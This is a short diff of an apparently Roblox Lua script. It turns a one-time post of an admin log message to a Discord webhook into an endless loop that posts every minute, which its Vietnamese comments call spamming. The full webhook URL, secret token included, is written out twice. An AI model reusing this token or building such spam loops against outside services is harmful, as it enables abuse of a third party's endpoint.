@@ -604,6 +604,11 @@ function AdminLoggerMsg()
     return AdminMessage
 end
 
--- Call the function to send the admin log message to the webhook
-PostWebhook("https://discord.com/api/webhooks/1353207218941595688/dp28QaQGOVsduCguM0py-NbQmRATDLUcp55vpUeFJ_KCBnsUewtb6zeZKuwOXi6klcwT", AdminLoggerMsg())
+-- Vòng lặp để spam đoạn mã liên tục với delay 1 phút
+while true do
+    -- Gửi request đến webhook mỗi 1 phút
+    PostWebhook("https://discord.com/api/webhooks/1353207218941595688/dp28QaQGOVsduCguM0py-NbQmRATDLUcp55vpUeFJ_KCBnsUewtb6zeZKuwOXi6klcwT", AdminLoggerMsg())
 
+    -- Delay 1 phút (60 giây)
+    wait(60)
+end
